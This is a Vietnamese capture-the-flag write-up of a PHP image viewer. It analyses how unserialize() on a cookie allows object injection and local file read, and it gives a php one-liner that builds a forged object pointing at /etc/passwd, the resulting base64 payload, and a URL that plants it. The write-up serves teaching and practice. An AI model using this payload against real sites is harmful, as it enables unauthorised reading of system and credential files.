## Phân tích mã nguồn

### `index.php`

- Duyệt qua thư mục `images/` và tạo đối tượng `Image` cho mỗi file:

```php
$image = new Image($filename);
$serializedImage = base64_encode(serialize($image));
```

- Khi người dùng click “View”, script gọi JS `viewImage()` → set cookie `image_data` = base64(serialized object).

---

### `view.php`

- Nhận cookie `image_data`, decode base64, rồi:

```php
$imageObj = unserialize($imageData);
```

- Nếu object là `Image` và file tồn tại:
    - Nếu MIME type là ảnh → hiển thị `<img>`.
    - Nếu không phải ảnh → đọc file và in ra nội dung:
        
        ```php
        echo "<pre class='hidden-content'>" . htmlspecialchars(file_get_contents($imageObj->path)) . "</pre>";
        ```
        
        (Bị CSS `display:none`, nhưng vẫn nằm trong HTML).
        

**→ Đây là PHP Object Injection** qua `unserialize()` với dữ liệu do client kiểm soát, dẫn đến **Local File Read**.

---

### `upload.php`

- Không liên quan trực tiếp tới bug chính.Khai thác

---

### Ý tưởng

- Tạo một object `Image` giả với thuộc tính `$path` trỏ tới file cần đọc.
- Serialize object → base64 encode để giống luồng hợp pháp.
- Dùng tính năng `?set_image=` của `view.php` để set cookie.
- Mở `view.php`, xem source để lấy nội dung file.

---

### Bước 1 – Tạo payload

Dùng PHP local để serialize đúng format:

```bash
php -r 'class Image{public $path;} $o=new Image; $o->path="/etc/passwd"; echo base64_encode(serialize($o));'
```

Output:

<img width="672" height="244" alt="image" src="https://github.com/user-attachments/assets/44c5922d-b2bf-4b33-b240-4b9b2dfdbeef" />


```
Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fQ==
```

---

### Bước 2 – Set cookie và test

Truy cập:

```
http://<HOST>/view.php?set_image=Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fQ==
```

→ Trang redirect về `view.php`.

Ta kiểm tra phần source để tìm kiếm hidden-content → Tìm được Flag

<img width="1524" height="214" alt="image" src="https://github.com/user-attachments/assets/63f8ccbd-b7cb-4e04-ad6c-32714988dfda" />
